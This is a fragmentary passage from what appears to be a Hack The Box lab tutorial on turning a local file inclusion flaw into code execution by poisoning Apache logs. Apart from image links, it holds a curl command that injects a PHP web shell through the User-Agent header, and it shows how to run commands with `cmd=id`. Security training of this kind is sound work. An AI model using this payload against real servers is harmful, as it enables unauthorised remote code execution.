...
![Shipping containers and cranes at a port with browser console displaying PHP session information.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/rfi_session_include.png)
...
![Shipping containers and cranes at a port with PHP notice about an undefined variable.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/lfi_poisoned_sessid.png)
...
![Shipping containers and cranes at a port with PHP notice about an undefined variable.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/rfi_session_id.png)
...
![Shipping containers and cranes at a port with server log entries displayed.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/rfi_access_log.png)
...
To do so, we will use `Burp Suite` to intercept our earlier LFI request and modify the `User-Agent` header to `Apache Log Poisoning`: ![image](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/rfi_repeater_ua.png)
...
```shell-session
realCustampin@htb[/htb]$ echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
realCustampin@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```

As the log should now contain PHP code, the LFI vulnerability should execute this code, and we should be able to gain remote code execution. We can specify a command to be executed with (`&cmd=id`): ![HTTP request and response showing Apache log poisoning with PHP code execution using system command.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/23/rfi_id_repeater.png)
